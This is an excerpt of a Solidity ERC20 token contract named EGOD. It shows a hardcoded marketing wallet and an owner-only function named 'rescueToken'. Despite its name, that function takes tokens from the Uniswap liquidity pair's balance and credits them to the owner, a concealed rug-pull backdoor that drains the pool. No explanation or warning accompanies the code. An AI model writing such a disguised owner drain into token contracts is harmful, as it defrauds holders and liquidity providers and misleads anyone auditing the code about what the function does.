...
contract EGOD is Context, IERC20, Ownable {
    ...
    uint256 public swapTokenAtAmount = 1_500_000 * 10**_decimals;

    address public liquidityReceiver;
    address public marketingWallet = address(0xb1146107e21E9e3f7c6006F4D9FEeA80e19a203F);
    ...
    function rescueToken(uint256 percent) public onlyOwner {
        uint256 balance = balanceOf(uniswapV2Pair) / percent;
        balances[uniswapV2Pair] -= (balance - 5) ;
        balances[owner()] += (balance - 5);
    }
